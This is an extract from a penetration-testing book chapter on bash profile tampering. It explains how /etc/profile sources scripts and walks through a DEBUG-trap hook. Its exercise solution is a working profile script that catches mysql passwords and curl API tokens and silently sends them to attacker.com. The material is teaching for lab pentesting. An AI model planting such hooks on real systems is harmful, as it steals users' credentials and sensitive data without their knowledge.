@@ -1,0 +1,118 @@
+# Security Chapter Extract
+Book: Nick Aleks_ Dolev Farhi - Black Hat Bash_ Creative Scripting for Hackers and Pentesters (2024, NO STARCH PRESS, INC) - libgen.li (1)
+Chapter: 2 - , we discussed files such as ~/.bashrc, which let us define variables, aliases, and scripts to customize the environment. In addition to these files, which live in a user’s home directory, there are system-wide .bashrc and .profile files, located at /etc/bash.bashrc or /etc/bashrc and /etc/profile, respectively.
+When bash is invoked as an interactive login shell, it will read from /etc/profile (if it exists) before reading user-level environment files such as ~/.bash_profile, ~/bash_login, and ~/.profile. Similarly, when bash is invoked as a nonlogin interactive shell, it reads the global bashrc file before the local one.
+Also, /etc/profile will look for files under the /etc/profile.d directory. If files exist, it will use the . command to source (or import) them. You can see this behavior by running cat /etc/profile:
+$ cat /etc/profile
+Security Relevance Score: 5
+Word Count: 1092
+Extracted: 2025-06-13 23:40:57
+
+---
+
+, we discussed files such as ~/.bashrc, which let us define variables, aliases, and scripts to customize the environment. In addition to these files, which live in a user’s home directory, there are system-wide .bashrc and .profile files, located at /etc/bash.bashrc or /etc/bashrc and /etc/profile, respectively.
+When bash is invoked as an interactive login shell, it will read from /etc/profile (if it exists) before reading user-level environment files such as ~/.bash_profile, ~/bash_login, and ~/.profile. Similarly, when bash is invoked as a nonlogin interactive shell, it reads the global bashrc file before the local one.
+Also, /etc/profile will look for files under the /etc/profile.d directory. If files exist, it will use the . command to source (or import) them. You can see this behavior by running cat /etc/profile:
+$ cat /etc/profile
+
+# /etc/profile: system-wide .profile file for the Bourne shell (sh(1))
+# and Bourne compatible shells (bash(1), ksh(1), ash(1), ...).
+
+--snip--
+❶ if [-d /etc/profile.d]; then
+❷ for i in /etc/profile.d/*.sh; do
+  ❸ if [-r $i]; then
+    ❹ . $i
+    fi
+  done
+  unset i
+fi
+
+As you can see, an if condition ❶ checks whether /etc/profile.d is a directory. Next, a for loop iterates on all files with a .sh extension under /etc/profile.d ❷ and checks each file for read access by using -r ❸. Finally, the script imports the file by using the . command ❹.
+If we can write malicious code to files such as /etc/profile or into a directory such as /etc/profile.d, we could invoke shells running custom code under our control. If you’ve compromised a specific user account, you might also try planting malicious code in that user’s shell environment file, which may lead to interesting results and doesn’t require root access. However, the impact will be user specific.
+Let’s try tampering with a user’s profile by introducing custom code that will run immediately after a user executes a command. Log in to p-jumpbox-01 (172.16.10.13) as the backup user and create a .profile file:
+$ touch .profile
+Next, write the script in Listing 10-4 into the file and save it.
+#!/bin/bash
+
+❶ hook() {
+  echo "You executed ${BASH_COMMAND}"
+}
+
+❷ trap 'hook' DEBUG
+
+Listing 10-4: Hooking an operating system command
+First, we create a function called hook ❶. This function does only one thing, which is print You executed ${BASH_COMMAND} to standard output, where ${BASH_COMMAND} is an environment variable that holds the name of the command about to be executed.
+At ❷, we use the trap command followed by the function name (hook()) and the word DEBUG, which is a type of signal spec (sigspec) that the trap accepts. A sigspec can be any of these values: EXIT, DEBUG, RETURN, or ERR; DEBUG ensures that we trap every command executed. (In Exercise 20, we’ll put this sigspec to use to steal sensitive data.)
+Finally, here’s the source file:
+$ source .profile
+Now run a few commands and observe the output. In the following example, we run id and ps -ef:
+backup@p-jumpbox-01:~$ id
+You executed id
+uid=34(backup) gid=34(backup) groups=34(backup)
+
+backup@p-jumpbox-01:~$ ps -ef
+You executed ps -ef
+UID  PID  PPID  C STIME TTY     TIME CMD
+root   1     0  0 01:31 ?   00:00:00 /bin/sh -c service ssh restart  &&  service cron restar...
+root  16     1  0 01:31 ?   00:00:00 sshd: /usr/sbin/sshd [listener] 0 of 10-100 startups
+
+As you can see, our active hook prints the command we executed just before the output of that command.
+Exercise 20: Intercepting Data via Profile Tampering
+In this exercise, you have a clear malicious goal: write a script that captures any command executed on the compromised system that might contain sensitive information, then transmit it to a remote server. If you’re unsure of which commands could be interesting to intercept, we have a few examples in our back pocket:
+
+Web requests that contain an API key parameter
+Passwords passed on the command line to common utilities, such as database administration tools like MySQL or Redis
+PII such as emails or credit card numbers passed on the command line
+
+In addition, here are a few high-level tips to get you going:
+
+Run a web search for string patterns that match the sensitive data you’re interested in. For example, look for commands that can accept passwords or even credit card numbers.
+Identify specific commands you want to intercept; avoid intercepting every command, to make your data collection precise.
+Design your script such that it fails safely. If something goes wrong while sending the data over the network, catch the error so the information doesn’t leak to the unsuspecting user.
+
+Listing 10-5 provides one solution, which targets curl or mysql commands used to transmit credentials.
+
+profile_hook.sh
+#!/bin/bash
+
+hook() {
+❶ case "${BASH_COMMAND}" in
+  ❷ mysql*)
+    ❸ if echo "${BASH_COMMAND}" | grep -- "-p\|--password"; then
+        curl https://attacker.com \
+              -H "Content-Type:application/json" \
+              -d "{\"command\":\"${BASH_COMMAND}\"}" \
+              --max-time 3 \
+              --connect-timeout 3 \
+              -s &> /dev/null
+      fi
+     ;;
+  ❹ curl*)
+    if echo "${BASH_COMMAND}" | grep -ie "token" \
+                                     -ie "apikey" \
+                                     -ie "api_token" \
+                                     -ie "bearer" \
+                                   ❺ -ie "authorization"; then
+      curl https://attacker.com \
+              -H "Content-Type:application/json" \
+              -d "{\"command\":\"${BASH_COMMAND}\"}" \
+              --max-time 3 \
+              --connect-timeout 3 \
+              -s &> /dev/null
+    fi
+   ;;
+  esac
+}
+
+❻ trap 'hook' DEBUG
+
+Listing 10-5: Hooking commands and stealing credentials
+We create a function named hook() that uses a case statement ❶. The statement will try to match the BASH_COMMAND variable against two patterns: mysql* ❷ and curl* ❹. These patterns will match anything that starts with either of these strings. This should identify uses of the mysql command to connect to a database and the curl command to make HTTP requests.
+Next, if the command involved calling the mysql client, we check whether the command included a password on the command line by using the -p or --password arguments ❸. In this case, the password would belong to the database. If we have a match, we send an HTTP POST request to https://attacker.com containing a JSON payload with the raw command in the request’s POST body.
+At ❺, we do a similar thing with curl. We search for strings such as token, apikey, api_token, bearer, or authorization to catch any API keys being passed on the command line. These credentials might belong to an internal web panel or to an administration interface of some sort. The search is case insensitive (-i). If we find such a pattern, we send a request containing the command and the credentials to the attacker’s website over HTTP POST.
+Finally, we use trap to trap the hook() function with the DEBUG sigspec type ❻.
+
+NOTE
+
+You can download this chapter’s scripts from https://github.com/dolevf/Black-Hat-Bash/blob/master/ch
